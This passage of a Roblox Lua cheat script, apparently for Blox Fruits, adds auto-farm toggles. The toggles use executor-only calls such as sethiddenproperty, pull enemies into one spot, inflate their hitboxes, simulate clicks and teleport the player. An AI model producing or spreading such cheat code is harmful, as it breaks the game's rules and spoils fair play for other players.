                    v.HumanoidRootPart.CFrame = PosDragonScaleMon
                    v.HumanoidRootPart.CanCollide = false
                    v.HumanoidRootPart.Size = Vector3.new(50,50,50)
                    if v.Humanoid:FindFirstChild("Animator") then
                        v.Humanoid.Animator:Destroy()
                    end
                    sethiddenproperty(game.Players.LocalPlayer, "SimulationRadius",  math.huge)
                end
            end
        end)
    end)
end)
spawn(function()
    while wait() do
        if _G.AutoDragonScale then
            pcall(function()
                if game:GetService("Workspace").Enemies:FindFirstChild("Dragon Crew Warrior") or game:GetService("Workspace").Enemies:FindFirstChild("Dragon Crew Archer") then
                    for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                        if v.Name == "Dragon Crew Warrior" or v.Name == "Dragon Crew Archer" then
                            if v.Humanoid.Health > 0 then
                                repeat wait()
                                    StartMagnetDragonScaleMon = true
                                    v.HumanoidRootPart.CanCollide = false
                                    v.HumanoidRootPart.Size = Vector3.new(60, 60, 60)
                                    PosDragonScaleMon = v.HumanoidRootPart.CFrame
                                    getgenv().ToPos(v.HumanoidRootPart.CFrame * CFrame.new(0,40,0))
                                    game:GetService'VirtualUser':CaptureController()
                                    game:GetService'VirtualUser':Button1Down(Vector2.new(1280, 672))
                                until _G.AutoDragonScale == false or not v.Parent or v.Humanoid.Health <= 0
                            end
                        end
                    end
                else
                    StartMagnetDragonScaleMon = false
                    for i,v in pairs(game:GetService("ReplicatedStorage"):GetChildren()) do 
                        if v.Name == "Dragon Crew Warrior" then
                            getgenv().ToPos(v.HumanoidRootPart.CFrame * CFrame.new(0,40,0))
                        elseif v.Name == "Dragon Crew Archer" then
                            getgenv().ToPos(v.HumanoidRootPart.CFrame * CFrame.new(0,40,0))
                        end
                    end
                    getgenv().ToPos(CFrame.new(6478.65234375, 221.30038452148438, -464.4551086425781))
                end
            end)
        end
    end
end)
ItemFA:Toggle("Auto Farm Fish Tail ( Sea 3 )",false,function(v)
    _G.AutoFishTail = v
    _G.NChest = v
    _G.NonEffect = v
    _G.ToolEPPA = v
end)
spawn(function()
    game:GetService("RunService").Heartbeat:Connect(function()
        pcall(function()
            for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                if _G.AutoFishTail and StartMagnetFishTailMon and (v.Name == "Fishman Captain" or v.Name == "Fishman Raider") and (v.HumanoidRootPart.Position - PosFishTailMon.Position).magnitude <= 350 then
                    v.HumanoidRootPart.CFrame = PosFishTailMon
                    v.HumanoidRootPart.CanCollide = false
                    v.HumanoidRootPart.Size = Vector3.new(50,50,50)
                    if v.Humanoid:FindFirstChild("Animator") then
                        v.Humanoid.Animator:Destroy()
                    end
                    sethiddenproperty(game.Players.LocalPlayer, "SimulationRadius",  math.huge)
                end
            end
        end)
    end)
end)
spawn(function()
    while wait() do
        if _G.AutoFishTail then
            pcall(function()
                if game:GetService("Workspace").Enemies:FindFirstChild("Fishman Captain") or game:GetService("Workspace").Enemies:FindFirstChild("Fishman Raider") then
                    for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                        if v.Name == "Fishman Captain" or v.Name == "Fishman Raider" then
                            if v.Humanoid.Health > 0 then
                                repeat wait()
                                    StartMagnetFishTailMon = true
                                    v.HumanoidRootPart.CanCollide = false
                                    v.HumanoidRootPart.Size = Vector3.new(60, 60, 60)
                                    PosFishTailMon = v.HumanoidRootPart.CFrame
                                    getgenv().ToPos(v.HumanoidRootPart.CFrame * CFrame.new(0,40,0))
                                    game:GetService'VirtualUser':CaptureController()
                                    game:GetService'VirtualUser':Button1Down(Vector2.new(1280, 672))
                                until _G.AutoFishTail == false or not v.Parent or v.Humanoid.Health <= 0
                            end
                        end
                    end
                else
                    StartMagnetFishTailMon = false
                    for i,v in pairs(game:GetService("ReplicatedStorage"):GetChildren()) do 
                        if v.Name == "Fishman Captain" then
                            getgenv().ToPos(v.HumanoidRootPart.CFrame * CFrame.new(0,40,0))
                        elseif v.Name == "Fishman Raider" then
                            getgenv().ToPos(v.HumanoidRootPart.CFrame * CFrame.new(0,40,0))
                        end
                    end
                    getgenv().ToPos(CFrame.new(-10725.5966796875, 389.0518493652344, -8756.642578125))
                end
            end)
        end
    end
end)
ItemFA:Toggle("Auto Farm Mini Tusk ( Sea 3 )",false,function(v)
    _G.AutoMiniTusk = v
    _G.NChest = v
    _G.NonEffect = v
    _G.ToolEPPA = v
end)
spawn(function()
    game:GetService("RunService").Heartbeat:Connect(function()
        pcall(function()
            for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                if _G.AutoMiniTusk and StartMagnetMiniTuskMon and (v.Name == "Mythological Pirate") and (v.HumanoidRootPart.Position - PosMiniTuskMon.Position).magnitude <= 350 then
                    v.HumanoidRootPart.CFrame = PosMiniTuskMon
                    v.HumanoidRootPart.CanCollide = false
                    v.HumanoidRootPart.Size = Vector3.new(50,50,50)
                    if v.Humanoid:FindFirstChild("Animator") then
                        v.Humanoid.Animator:Destroy()
                    end
                    sethiddenproperty(game.Players.LocalPlayer, "SimulationRadius",  math.huge)
                end
            end
        end)
    end)
end)
spawn(function()
    while wait() do
        if _G.AutoMiniTusk then
            pcall(function()
                if game:GetService("Workspace").Enemies:FindFirstChild("Mythological Pirate") then
                    for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                        if v.Name == "Mythological Pirate" then
                            if v.Humanoid.Health > 0 then
                                repeat wait()
                                    StartMagnetMiniTuskMon = true
                                    v.HumanoidRootPart.CanCollide = false
                                    v.HumanoidRootPart.Size = Vector3.new(60, 60, 60)
                                    PosMiniTuskMon = v.HumanoidRootPart.CFrame
                                    getgenv().ToPos(v.HumanoidRootPart.CFrame * CFrame.new(0,40,0))
                                    game:GetService'VirtualUser':CaptureController()
                                    game:GetService'VirtualUser':Button1Down(Vector2.new(1280, 672))
                                until _G.AutoMiniTusk == false or not v.Parent or v.Humanoid.Health <= 0
                            end
                        end
                    end
                else
                    StartMagnetMiniTuskMon = false
                    for i,v in pairs(game:GetService("ReplicatedStorage"):GetChildren()) do 
                        if v.Name == "Mythological Pirate" then
                            getgenv().ToPos(v.HumanoidRootPart.CFrame * CFrame.new(0,40,0))
                        end
                    end
                    getgenv().ToPos(CFrame.new(-13506.8876953125, 581.2981567382812, -6984.64794921875))
                end
            end)
        end
    end
end)
ItemFA:Toggle("Auto Farm Scrap Metal ( Sea 3 )",false,function(v)
    _G.AutoScrapMetal = v
    _G.NChest = v
    _G.NonEffect = v
    _G.ToolEPPA = v
end)
ItemFA:Toggle("Auto Farm Leather ( Sea 3 )",false,function(v)
    _G.AutoScrapMetal = v
    _G.NChest = v
    _G.NonEffect = v
    _G.ToolEPPA = v
end)
spawn(function()
    game:GetService("RunService").Heartbeat:Connect(function()
        pcall(function()
            for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                if _G.AutoScrapMetal and StartMagnetScrapMetalMon and (v.Name == "Forest Pirate") and (v.HumanoidRootPart.Position - PosScrapMetalMon.Position).magnitude <= 350 then
                    v.HumanoidRootPart.CFrame = PosScrapMetalMon
                    v.HumanoidRootPart.CanCollide = false
                    v.HumanoidRootPart.Size = Vector3.new(50,50,50)
                    if v.Humanoid:FindFirstChild("Animator") then
                        v.Humanoid.Animator:Destroy()
                    end
                    sethiddenproperty(game.Players.LocalPlayer, "SimulationRadius",  math.huge)
                end
            end
        end)
    end)
end)
spawn(function()
    while wait() do
        if _G.AutoScrapMetal then
            pcall(function()
                if game:GetService("Workspace").Enemies:FindFirstChild("Forest Pirate") then
                    for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                        if v.Name == "Forest Pirate" then
                            if v.Humanoid.Health > 0 then
                                repeat wait()
                                    StartMagnetScrapMetalMon = true
                                    v.HumanoidRootPart.CanCollide = false
                                    v.HumanoidRootPart.Size = Vector3.new(60, 60, 60)
                                    PosScrapMetalMon = v.HumanoidRootPart.CFrame
                                    getgenv().ToPos(v.HumanoidRootPart.CFrame * CFrame.new(0,40,0))
                                    game:GetService'VirtualUser':CaptureController()
                                    game:GetService'VirtualUser':Button1Down(Vector2.new(1280, 672))
                                until _G.AutoScrapMetal == false or not v.Parent or v.Humanoid.Health <= 0
                            end
                        end
                    end
                else
                    StartMagnetScrapMetalMon = false
                    for i,v in pairs(game:GetService("ReplicatedStorage"):GetChildren()) do 
                        if v.Name == "Forest Pirate" then
                            getgenv().ToPos(v.HumanoidRootPart.CFrame * CFrame.new(0,40,0))
                        end
                    end
                    getgenv().ToPos(CFrame.new(-13266.357421875, 428.193603515625, -7780.2509765625))
                end
            end)
        end
    end
end)
ItemFA:Toggle("Auto Farm Magma Ore ( Sea 1 )",false,function(v)
    _G.Auto_Farm_Magma_Ore = v
    _G.NChest = v
    _G.NonEffect = v
    _G.ToolEPPA = v
end)
spawn(function()
    game:GetService("RunService").Heartbeat:Connect(function()
        pcall(function()
            for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                if _G.Auto_Farm_Magma_Ore and StartMagnetMagmaOreMon and (v.Name == "Military Soldier" or v.Name == "Military Spy") and (v.HumanoidRootPart.Position - PosMonMagmaOre.Position).magnitude <= 350 then
                    v.HumanoidRootPart.CFrame = PosMonMagmaOre
                    v.HumanoidRootPart.CanCollide = false
                    v.HumanoidRootPart.Size = Vector3.new(60,60,60)
                    if v.Humanoid:FindFirstChild("Animator") then
                        v.Humanoid.Animator:Destroy()
                    end
                    sethiddenproperty(game.Players.LocalPlayer, "SimulationRadius",  math.huge)
                end
            end
        end)
    end)
end)
spawn(function()
    while wait() do
        if _G.Auto_Farm_Magma_Ore then
            pcall(function()
                if game:GetService("Workspace").Enemies:FindFirstChild("Military Soldier") or game:GetService("Workspace").Enemies:FindFirstChild("Military Spy") then
                    for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                        if v.Name == "Military Soldier" or v.Name == "Military Spy" then
                            if v.Humanoid.Health > 0 then
                                repeat wait()
                                    StartMagnetMagmaOreMon = true
                                    v.HumanoidRootPart.CanCollide = false
                                    v.HumanoidRootPart.Size = Vector3.new(60, 60, 60)
                                    PosMonMagmaOre = v.HumanoidRootPart.CFrame
                                    getgenv().ToPos(v.HumanoidRootPart.CFrame * CFrame.new(0,_G.Select_Distance,0))
                                    game:GetService'VirtualUser':CaptureController()
                                    game:GetService'VirtualUser':Button1Down(Vector2.new(1280, 672))
                                until _G.Auto_Farm_Magma_Ore == false or not v.Parent or v.Humanoid.Health <= 0
                            end
                        end
                    end
                else
                    StartMagnetMagmaOreMon = false
                    for i,v in pairs(game:GetService("ReplicatedStorage"):GetChildren()) do 
                        if v.Name == "Military Soldier" then
                            getgenv().ToPos(v.HumanoidRootPart.CFrame * CFrame.new(0,_G.Select_Distance,0))
                        elseif v.Name == "Military Spy" then
                            getgenv().ToPos(v.HumanoidRootPart.CFrame * CFrame.new(0,_G.Select_Distance,0))
                        end
                    end
                    getgenv().ToPos(CFrame.new(-5363.01123, 41.5056877, 8548.47266, -0.578253984, -3.29503091e-10, 0.815856814, 9.11209668e-08, 1, 6.498761e-08, -0.815856814, 1.11920997e-07, -0.578253984))
                end
            end)
        end
    end
end)
ItemFA:Toggle("Auto Farm Conjured Cocoa ( Sea 3 )",false,function(v)
    _G.Auto_Farm_Conjured_Cocoa = v
    _G.NChest = v
    _G.NonEffect = v
    _G.ToolEPPA = v
end)
spawn(function()
    game:GetService("RunService").Heartbeat:Connect(function()
        pcall(function()
            for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                if _G.Auto_Farm_Conjured_Cocoa and StartMagnetConjuredCocoaMon and (v.Name == "Cocoa Warrior" or v.Name == "Chocolate Bar Battler") and (v.HumanoidRootPart.Position - PosMonConjuredCocoa.Position).magnitude <= 350 then
                    v.HumanoidRootPart.CFrame = PosMonConjuredCocoa
                    v.HumanoidRootPart.CanCollide = false
                    v.HumanoidRootPart.Size = Vector3.new(60,60,60)
                    if v.Humanoid:FindFirstChild("Animator") then
                        v.Humanoid.Animator:Destroy()
                    end
                    sethiddenproperty(game.Players.LocalPlayer, "SimulationRadius",  math.huge)
                end
            end
        end)
    end)
end)

spawn(function()
    while wait() do
        if _G.Auto_Farm_Conjured_Cocoa then
            pcall(function()
                if game:GetService("Workspace").Enemies:FindFirstChild("Cocoa Warrior") or game:GetService("Workspace").Enemies:FindFirstChild("Chocolate Bar Battler") then
                    for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                        if v.Name == "Cocoa Warrior" or v.Name == "Chocolate Bar Battler" then
                            if v.Humanoid.Health > 0 then
                                repeat wait()
                                    StartMagnetConjuredCocoaMon = true
                                    v.HumanoidRootPart.CanCollide = false
                                    v.HumanoidRootPart.Size = Vector3.new(60, 60, 60)
                                    PosMonConjuredCocoa = v.HumanoidRootPart.CFrame
                                    getgenv().ToPos(v.HumanoidRootPart.CFrame * CFrame.new(0,_G.Select_Distance,0))
                                    game:GetService'VirtualUser':CaptureController()
                                    game:GetService'VirtualUser':Button1Down(Vector2.new(1280, 672))
                                until _G.Auto_Farm_Conjured_Cocoa == false or not v.Parent or v.Humanoid.Health <= 0
                            end
                        end
                    end
                else
                    StartMagnetConjuredCocoaMon = false
                    for i,v in pairs(game:GetService("ReplicatedStorage"):GetChildren()) do 
                        if v.Name == "Cocoa Warrior" then
                            getgenv().ToPos(v.HumanoidRootPart.CFrame * CFrame.new(0,_G.Select_Distance,0))
                        elseif v.Name == "Chocolate Bar Battler" then
                            getgenv().ToPos(v.HumanoidRootPart.CFrame * CFrame.new(0,_G.Select_Distance,0))
                        end
                    end
                    getgenv().ToPos(CFrame.new(402.7189025878906, 81.06050109863281, -12259.54296875))
                end
            end)
        end
    end
end)
ItemFA:Toggle("Auto Farm Angel Wing ( Sea 1 )",false,function(v)
    _G.Auto_Farm_Angel_Wing = v
    _G.NChest = v
    _G.NonEffect = v
    _G.ToolEPPA = v
end)
spawn(function()
    game:GetService("RunService").Heartbeat:Connect(function()
        pcall(function()
            for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                if _G.Auto_Farm_Angel_Wing and StartMagnetAngelWingMon and (v.Name == "Royal Squad" or v.Name == "Royal Soldier") and (v.HumanoidRootPart.Position - PosMonAngelWing.Position).magnitude <= 350 then
                    v.HumanoidRootPart.CFrame = PosMonAngelWing
                    v.HumanoidRootPart.CanCollide = false
                    v.HumanoidRootPart.Size = Vector3.new(60,60,60)
                    if v.Humanoid:FindFirstChild("Animator") then
                        v.Humanoid.Animator:Destroy()
                    end
                    sethiddenproperty(game.Players.LocalPlayer, "SimulationRadius",  math.huge)
                end
            end
        end)
    end)
end)

spawn(function()
    while wait() do
        if _G.Auto_Farm_Angel_Wing then
            pcall(function()
                if game:GetService("Workspace").Enemies:FindFirstChild("Royal Squad") or game:GetService("Workspace").Enemies:FindFirstChild("Royal Soldier") then
                    for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                        if v.Name == "Royal Squad" or v.Name == "Royal Soldier" then
                            if v.Humanoid.Health > 0 then
                                repeat wait()
                                    StartMagnetAngelWingMon = true
                                    v.HumanoidRootPart.CanCollide = false
                                    v.HumanoidRootPart.Size = Vector3.new(60, 60, 60)
                                    PosMonAngelWing = v.HumanoidRootPart.CFrame
                                    getgenv().ToPos(v.HumanoidRootPart.CFrame * CFrame.new(0,_G.Select_Distance,0))
                                    game:GetService'VirtualUser':CaptureController()
                                    game:GetService'VirtualUser':Button1Down(Vector2.new(1280, 672))
                                until _G.Auto_Farm_Angel_Wing == false or not v.Parent or v.Humanoid.Health <= 0
                            end
                        end
                    end
                else
                    StartMagnetAngelWingMon = false
                    for i,v in pairs(game:GetService("ReplicatedStorage"):GetChildren()) do 
                        if v.Name == "Royal Squad" then
                            getgenv().ToPos(v.HumanoidRootPart.CFrame * CFrame.new(0,_G.Select_Distance,0))
                        elseif v.Name == "Royal Soldier" then
                            getgenv().ToPos(v.HumanoidRootPart.CFrame * CFrame.new(0,_G.Select_Distance,0))
                        end
                    end
                    getgenv().ToPos(CFrame.new(-7957.654296875, 5644.396484375, -1457.434814453125))
                end
            end)
        end
    end
end)
ItemFA:Toggle("Auto Farm Ectoplasm ( Sea 2 )",false,function(v)
    _G.Auto_Farm_Ectoplasm = v
    _G.NChest = v
    _G.NonEffect = v
    _G.ToolEPPA = v
end)
spawn(function()
    game:GetService("RunService").Heartbeat:Connect(function()
        pcall(function()
            for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                if _G.Auto_Farm_Ectoplasm and MagnetEctoplasm and string.find(v.Name, "Ship") and (v.HumanoidRootPart.Position - PosMonEctoplasm.Position).magnitude <= 350 then
                    v.HumanoidRootPart.CFrame = PosMonEctoplasm
                    v.HumanoidRootPart.CanCollide = false
                    v.HumanoidRootPart.Size = Vector3.new(60,60,60)
                    if v.Humanoid:FindFirstChild("Animator") then
                        v.Humanoid.Animator:Destroy()
                    end
                    sethiddenproperty(game.Players.LocalPlayer, "SimulationRadius",  math.huge)
                end
            end
        end)
    end)
end)
spawn(function()
    while wait() do
        if _G.Auto_Farm_Ectoplasm then
            pcall(function()
                if game:GetService("Workspace").Enemies:FindFirstChild("Ship Deckhand") or game:GetService("Workspace").Enemies:FindFirstChild("Ship Engineer") or game:GetService("Workspace").Enemies:FindFirstChild("Ship Steward") or game:GetService("Workspace").Enemies:FindFirstChild("Ship Officer") then
                    for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                        if string.find(v.Name, "Ship") then
                            repeat wait()
                                PosMonEctoplasm = v.HumanoidRootPart.CFrame
                                v.HumanoidRootPart.CanCollide = false
                                v.HumanoidRootPart.Size = Vector3.new(60,60,60)
                                getgenv().ToPos(v.HumanoidRootPart.CFrame * CFrame.new(0,_G.Select_Distance,0))
                                MagnetEctoplasm = true
                                game:GetService'VirtualUser':CaptureController()
                                game:GetService'VirtualUser':Button1Down(Vector2.new(1280, 672))
                            until _G.Auto_Farm_Ectoplasm == false or not v.Parent or v.Humanoid.Health <= 0
                            MagnetEctoplasm = false
                        else
                            MagnetEctoplasm = false
                            getgenv().ToPos(CFrame.new(904.4072265625, 181.05767822266, 33341.38671875))
                        end
                    end
                else
                    MagnetEctoplasm = false
                    local Distance = (Vector3.new(904.4072265625, 181.05767822266, 33341.38671875) - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude
                    if Distance > 20000 then
                        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("requestEntrance",Vector3.new(923.21252441406, 126.9760055542, 32852.83203125))
                    end
                    getgenv().ToPos(CFrame.new(904.4072265625, 181.05767822266, 33341.38671875))
                end
            end)
        end
    end
end)
ItemFA:Toggle("Auto Farm Radioactive ( Sea 2 )",false,function(v)
    _G.Auto_Farm_Radioactive = v
    _G.NChest = v
    _G.NonEffect = v
    _G.ToolEPPA = v
end)
spawn(function()
    game:GetService("RunService").Heartbeat:Connect(function()
        pcall(function()
            for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                if _G.Auto_Farm_Radioactive and StartMagnetRadioactive and v.Name == "Factory Staff" and (v.HumanoidRootPart.Position - PosMonRadioactive.Position).magnitude <= 350 then
                    v.HumanoidRootPart.CFrame = PosMonRadioactive
                    v.HumanoidRootPart.CanCollide = false
                    v.HumanoidRootPart.Size = Vector3.new(60,60,60)
                    if v.Humanoid:FindFirstChild("Animator") then
                        v.Humanoid.Animator:Destroy()
                    end
                    sethiddenproperty(game.Players.LocalPlayer, "SimulationRadius",  math.huge)
                end
            end
        end)
    end)
end)

spawn(function()
    while wait() do
        if _G.Auto_Farm_Radioactive then
            pcall(function()
                if game:GetService("Workspace").Enemies:FindFirstChild("Factory Staff") then
                    for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                        if v.Name == "Factory Staff" then
                            if v.Humanoid.Health > 0 then
                                repeat wait()
                                    StartMagnetRadioactive = true
                                    v.HumanoidRootPart.CanCollide = false
                                    v.HumanoidRootPart.Size = Vector3.new(60, 60, 60)
                                    PosMonRadioactive = v.HumanoidRootPart.CFrame
                                    getgenv().ToPos(v.HumanoidRootPart.CFrame * CFrame.new(0,_G.Select_Distance,0))
                                    game:GetService'VirtualUser':CaptureController()
                                    game:GetService'VirtualUser':Button1Down(Vector2.new(1280, 672))
                                until _G.Auto_Farm_Radioactive == false or not v.Parent or v.Humanoid.Health <= 0
                            end
                        end
                    end
                else
                    StartMagnetRadioactive = false
                    for i,v in pairs(game:GetService("ReplicatedStorage"):GetChildren()) do 
                        if v.Name == "Factory Staff" then
                            getgenv().ToPos(v.HumanoidRootPart.CFrame * CFrame.new(0,_G.Select_Distance,0))
                        end
                    end
                    getgenv().ToPos(CFrame.new(262.9140625, 72.95976257324219, -89.57562255859375))
                end
            end)
        end
    end
end)
ItemFA:Toggle("Auto Farm Vampire Fang ( Sea 2 )",false,function(v)
    _G.Auto_Farm_Vampire_Fang = v
    _G.NChest = v
    _G.NonEffect = v
    _G.ToolEPPA = v
end)
spawn(function()
    game:GetService("RunService").Heartbeat:Connect(function()
        pcall(function()
            for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                if _G.Auto_Farm_Vampire_Fang and StartMagnetVampireFang and v.Name == "Vampire" and (v.HumanoidRootPart.Position - PosMonVampireFang.Position).magnitude <= 350 then
                    v.HumanoidRootPart.CFrame = PosMonVampireFang
                    v.HumanoidRootPart.CanCollide = false
                    v.HumanoidRootPart.Size = Vector3.new(60,60,60)
                    if v.Humanoid:FindFirstChild("Animator") then
                        v.Humanoid.Animator:Destroy()
                    end
                    sethiddenproperty(game.Players.LocalPlayer, "SimulationRadius",  math.huge)
                end
            end
        end)
    end)
end)

spawn(function()
    while wait() do
        if _G.Auto_Farm_Vampire_Fang then
            pcall(function()
                if game:GetService("Workspace").Enemies:FindFirstChild("Vampire") then
                    for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                        if v.Name == "Vampire" then
                            if v.Humanoid.Health > 0 then
                                repeat wait()
                                    StartMagnetVampireFang = true
                                    v.HumanoidRootPart.CanCollide = false
                                    v.HumanoidRootPart.Size = Vector3.new(60, 60, 60)
                                    PosMonVampireFang = v.HumanoidRootPart.CFrame
                                    getgenv().ToPos(v.HumanoidRootPart.CFrame * CFrame.new(0,_G.Select_Distance,0))
                                    game:GetService'VirtualUser':CaptureController()
                                    game:GetService'VirtualUser':Button1Down(Vector2.new(1280, 672))
                                until _G.Auto_Farm_Vampire_Fang == false or not v.Parent or v.Humanoid.Health <= 0
                            end
                        end
                    end
                else
                    StartMagnetRadioactive = false
                    for i,v in pairs(game:GetService("ReplicatedStorage"):GetChildren()) do 
                        if v.Name == "Vampire" then
                            getgenv().ToPos(v.HumanoidRootPart.CFrame * CFrame.new(0,_G.Select_Distance,0))
                        end
                    end
                    getgenv().ToPos(CFrame.new(-6041.29248046875, 6.402710914611816, -1304.63330078125))
                end
            end)
        end
    end
end)
ItemFA:Toggle("Auto Farm Mystic Droplet ( Sea 2 )",false,function(v)
    _G.Auto_Farm_Mystic_Droplet = v
    _G.NChest = v
    _G.NonEffect = v
    _G.ToolEPPA = v
end)
spawn(function()
    game:GetService("RunService").Heartbeat:Connect(function()
        pcall(function()
            for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                if _G.Auto_Farm_Mystic_Droplet and StartMagnetMysticDropletMon and (v.Name == "Sea Soldier") and (v.HumanoidRootPart.Position - PosMonMysticDroplet.Position).magnitude <= 350 then
                    v.HumanoidRootPart.CFrame = PosMonMysticDroplet
                    v.HumanoidRootPart.CanCollide = false
                    v.HumanoidRootPart.Size = Vector3.new(60,60,60)
                    if v.Humanoid:FindFirstChild("Animator") then
                        v.Humanoid.Animator:Destroy()
                    end
                    sethiddenproperty(game.Players.LocalPlayer, "SimulationRadius",  math.huge)
                end
            end
        end)
    end)
end)

spawn(function()
    while wait() do
        if _G.Auto_Farm_Mystic_Droplet then
            pcall(function()
                if game:GetService("Workspace").Enemies:FindFirstChild("Sea Soldier") then
                    for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                        if v.Name == "Sea Soldier" then
                            if v.Humanoid.Health > 0 then
                                repeat wait()
                                    StartMagnetMysticDropletMon = true
                                    v.HumanoidRootPart.CanCollide = false
                                    v.HumanoidRootPart.Size = Vector3.new(60, 60, 60)
                                    PosMonMysticDroplet = v.HumanoidRootPart.CFrame
                                    getgenv().ToPos(v.HumanoidRootPart.CFrame * CFrame.new(0,_G.Select_Distance,0))
                                    game:GetService'VirtualUser':CaptureController()
                                    game:GetService'VirtualUser':Button1Down(Vector2.new(1280, 672))
                                until _G.Auto_Farm_Mystic_Droplet == false or not v.Parent or v.Humanoid.Health <= 0
                            end
                        end
                    end
                else
                    StartMagnetMysticDropletMon = false
                    for i,v in pairs(game:GetService("ReplicatedStorage"):GetChildren()) do 
                        if v.Name == "Sea Soldier" then
                            getgenv().ToPos(v.HumanoidRootPart.CFrame * CFrame.new(0,_G.Select_Distance,0))
                        end
                    end
                    getgenv().ToPos(CFrame.new(-2955.86328125, 15.63549518585205, -9725.2802734375))
                end
            end)
        end
    end
end)
TusitaSSCZ:Toggle("Auto Touch",false,function(v)
    _G.Touchses = v
end)
spawn(function()
    while wait() do
        if _G.Touchses then
            pcall(function()
                wait(1)
                repeat
                    getgenv().ToPos(CFrame.new(-10752, 417, -9366))
                    wait()
                until not _G.Auto_Holy_Torch or (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - Vector3.new((-10752), 417, (-9366))).Magnitude <= 10
                wait(1)
                repeat
                    getgenv().ToPos(CFrame.new(-11672, 334, -9474))
                    wait()
                until not _G.Auto_Holy_Torch or (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - Vector3.new((-11672), 334, (-9474))).Magnitude <= 10
                wait(1)
                repeat
                    getgenv().ToPos(CFrame.new(-12132, 521, -10655))
                    wait()
                until not _G.Auto_Holy_Torch or (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - Vector3.new((-12132), 521, (-10655))).Magnitude <= 10
                wait(1)
                repeat
                    getgenv().ToPos(CFrame.new(-13336, 486, -6985))
                    wait()
                until not _G.Auto_Holy_Torch or (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - Vector3.new((-13336), 486, (-6985))).Magnitude <= 10
                wait(1)
                repeat
                    getgenv().ToPos(CFrame.new(-13489, 332, -7925))
                    wait()
                until not _G.Auto_Holy_Torch or (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - Vector3.new((-13489), 332, (-7925))).Magnitude <= 10
            end)
        end
    end
end)
TusitaSSCZ:Toggle("Auto Kill Tusita Mob",false,function(v)
    _G.Auto_Quest_Tushita_2 = v
end)
spawn(function()
    while wait() do
        if _G.Auto_Quest_Tushita_2 then
            pcall(function()
                if ((CFrame.new((-5539.3115234375), 313.800537109375, (-2972.372314453125))).Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 500 then
                    for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
                        if _G.Auto_Quest_Tushita_2 and v:FindFirstChild("HumanoidRootPart") and v:FindFirstChild("Humanoid") and v.Humanoid.Health > 0 then
                            if (v.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude < 2000 then
                                repeat
                                    wait()
                                    getgenv().ToPos(v.HumanoidRootPart.CFrame * CFrame.new(0,_G.Select_Distance,0))
                                    v.HumanoidRootPart.Size = Vector3.new(60, 60, 60)
                                    v.HumanoidRootPart.Transparency = 1
                                    v.Humanoid.JumpPower = 0
                                    v.Humanoid.WalkSpeed = 0
                                    v.HumanoidRootPart.CanCollide = false
                                    FarmPos = v.HumanoidRootPart.CFrame
                                    MonFarm = v.Name
                                    if v.Humanoid.Health <= 0 and v.Humanoid:FindFirstChild("Animator") then
                                        v.Humanoid.Animator:Destroy()
                                    end
                                until v.Humanoid.Health <= 0 or (not v.Parent) or _G.Auto_Quest_Tushita_2 == false
                            end
                        end
                    end
                else
                    getgenv().ToPos(CFrame.new(-5545.1240234375, 313.800537109375, -2976.616455078125))
                end
            end)
        end
    end
end)
local TerrorSharkCheck_i = Mys3:Label("TerrorShark : N/A")
spawn(function()
    pcall(function()
        while wait() do
            if game:GetService("ReplicatedStorage"):FindFirstChild("Terrorshark") then
                TerrorSharkCheck_i:Change("TerrorShark : Spawn")
            else
                TerrorSharkCheck_i:Change("TerrorShark : Not Spawn")
            end
        end
    end)
end)
local PiranhaCheck_i = Mys3:Label("Piranha : N/A")
spawn(function()
    pcall(function()
        while wait() do
            if game:GetService("ReplicatedStorage"):FindFirstChild("Piranha") then
                PiranhaCheck_i:Change("Piranha : Spawn")
            else
                PiranhaCheck_i:Change("Piranha : Not Spawn")
            end
        end
    end)
end)
local NormalSharkCheck_i = Mys3:Label("Shark : N/A")
spawn(function()
    pcall(function()
        while wait() do
            if game:GetService("ReplicatedStorage"):FindFirstChild("Shark") then
                NormalSharkCheck_i:Change("Shark : Spawn")
            else
                NormalSharkCheck_i:Change("Shark : Not Spawn")
            end
        end
    end)
end)
local FishCrewMembersCheck_i = Mys3:Label("Fish Crew Member : N/A")
spawn(function()
    pcall(function()
        while wait() do
            if game:GetService("ReplicatedStorage"):FindFirstChild("Fish Crew Member") then
                FishCrewMembersCheck_i:Change("Fish Crew Member : Spawn")
            else
                FishCrewMembersCheck_i:Change("Fish Crew Member : Not Spawn")
            end
        end
    end)
end)
--Tween Boats 
function TPB(CFgo)
    local tween_s = game:service"TweenService"
    local info = TweenInfo.new((game:GetService("Workspace").Boats.PirateBrigade.VehicleSeat.CFrame.Position - CFgo.Position).Magnitude/300, Enum.EasingStyle.Linear)
    tween = tween_s:Create(game:GetService("Workspace").Boats.PirateBrigade.VehicleSeat, info, {CFrame = CFgo})
    tween:Play()
    
